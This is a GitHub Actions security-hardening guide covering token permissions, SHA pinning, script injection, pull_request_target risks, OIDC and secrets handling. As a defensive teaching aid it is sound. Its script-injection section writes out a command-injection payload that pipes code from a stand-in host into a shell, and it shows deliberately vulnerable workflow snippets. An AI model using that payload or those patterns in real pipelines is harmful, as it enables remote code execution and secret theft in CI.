# Actions Security Hardening

Apply these defaults to every workflow you write or review — not only when asked about security. Primary source: <https://docs.github.com/en/actions/reference/security/secure-use>.

## Least-privilege GITHUB_TOKEN

Declare `permissions` explicitly in every workflow, starting from read-only and widening per job:

```yaml
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write        # only this job can push tags/releases
      packages: write        # ghcr push
```

Why: every step — including third-party actions — sees the token. A compromised action in a `write-all` workflow can rewrite the repo; in a `contents: read` workflow it can't. Common grants: `pull-requests: write` (comment/label PRs), `issues: write`, `packages: write` (GHCR), `id-token: write` (OIDC), `security-events: write` (code scanning upload), `attestations: write`. Also set the org/repo default ("Workflow permissions") to read-only so forgotten workflows fail safe.

## Pin actions to a full commit SHA

```yaml
# third-party: always full SHA + version comment
- uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
# first-party actions/* : major tag acceptable if the user prefers convenience
- uses: actions/checkout@v7
```

Why: tags and branches are mutable — an attacker with push access to the action repo can move `v3` to a malicious commit and instantly compromise every consumer (this is exactly how real supply-chain attacks on popular actions have worked). A full SHA is the only immutable reference. Keep pins fresh with Dependabot:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

Dependabot updates the SHA and the version comment together. Audit unfamiliar actions before adopting: read the source at the pinned ref, prefer verified creators, check that the action doesn't exfiltrate the token or env. Organizations can enforce an allowlist (Settings → Actions → "Allow specified actions") or SHA-pinning policies.

## Script injection

Any `${{ }}` interpolated into a `run:` script is pasted into the shell **before** execution. Attacker-controllable values — PR titles/bodies, branch names, commit messages, issue titles, review comments, usernames — can carry payloads like `"; curl evil | sh; "`.

```yaml
# VULNERABLE — title becomes shell code
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# SAFE — env var, quoted; data stays data
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"
```

Rules: route untrusted context through `env:`; quote the variable in the script; for complex handling, pass values as arguments to a JavaScript action instead of inline shell. The same applies to `github-script` (use `process.env`) and to composite action inputs. Enable CodeQL workflow scanning / `actionlint` — both flag common injection patterns.

## pull_request_target and workflow_run

`pull_request` from a fork runs with a read-only token and no secrets — safe. `pull_request_target` runs in the **base** repo context: secrets available, write token, triggered by the fork's PR. The fatal pattern is checking out and executing untrusted PR code in that context:

```yaml
# NEVER do this in pull_request_target
- uses: actions/checkout@v7
  with:
    ref: ${{ github.event.pull_request.head.sha }}   # untrusted code + secrets = compromise
```

If you must use `pull_request_target` (e.g., labeling fork PRs), don't check out the PR head; if you must read PR files, checkout with `persist-credentials: false`, treat contents as data only, and never run their scripts/build. Similarly, `workflow_run` workflows are privileged — treat artifacts downloaded from the triggering (possibly fork) run as untrusted input, and remember caches are shared: a poisoned cache written by a less-privileged workflow can be read by a privileged one.

## OIDC for cloud auth

Replace long-lived cloud keys in secrets with OpenID Connect: the runner requests a short-lived JWT whose claims (`repo:org/repo:ref:refs/heads/main`, `repo:org/repo:environment:prod`) the cloud provider validates against a trust policy, then issues temporary credentials.

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v6
    with:
      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
      aws-region: eu-central-1
```

Equivalents: `azure/login`, `google-github-actions/auth`, HashiCorp Vault JWT auth. Scope the cloud-side trust condition to exact repo + branch/environment — never a wildcard `repo:org/*`. Benefits: nothing to rotate, nothing to steal from secrets, per-run credentials.

## Secrets handling

- Store secrets only in GitHub Secrets (repo, environment, or org level); environment secrets + required reviewers gate production credentials.
- Secrets are masked in logs, but masking is best-effort: never `echo` a secret, never pass one as a CLI argument (visible in process lists), never write one to an artifact. Register derived values with `::add-mask::` / `core.setSecret()`.
- Secrets are not available to `pull_request` runs from forks by design — don't work around that.
- Structured secrets (JSON blobs) defeat masking of their parts; store fields separately.
- Rotate on any suspected exposure and delete affected logs. Review registered secrets periodically and remove stale ones (`gh secret list`).
- Enable secret scanning + push protection on the repo (Settings → Code security) so leaked tokens are caught at push time.

## Runners and artifacts

- Self-hosted runners on **public** repos are effectively remote code execution for any fork PR author — almost never do this. Even privately: use ephemeral/just-in-time runners, isolate them in runner groups, restrict which repos may use them, patch aggressively, and give them minimal network/cloud permissions.
- Artifacts: `actions/upload-artifact` v4+ artifacts are immutable, but anything uploaded from an untrusted run stays untrusted when downloaded elsewhere. Don't upload secrets or `.git/config` (checkout's `persist-credentials` writes the token there — set `persist-credentials: false` when the checkout is only read).
- Supply-chain extras for released software: generate build provenance (`actions/attest-build-provenance`, `gh attestation verify`), sign images (cosign), and add `dependency-review-action` + CodeQL to CI.

## Review checklist

- [ ] `permissions` explicit, minimal, job-scoped where they widen
- [ ] Third-party actions pinned to full SHA with version comment; Dependabot for `github-actions` enabled
- [ ] No `${{ }}` of attacker-controllable values inside `run:` — all via `env:`
- [ ] No checkout/execution of fork code under `pull_request_target` / `workflow_run`
- [ ] Cloud auth via OIDC with tightly-scoped trust conditions, not static keys
- [ ] Secrets never echoed/passed as args/uploaded; environment protection on deploy jobs
- [ ] `timeout-minutes` set; `concurrency` prevents pile-ups
- [ ] Self-hosted runners: not on public repos, ephemeral, grouped, patched
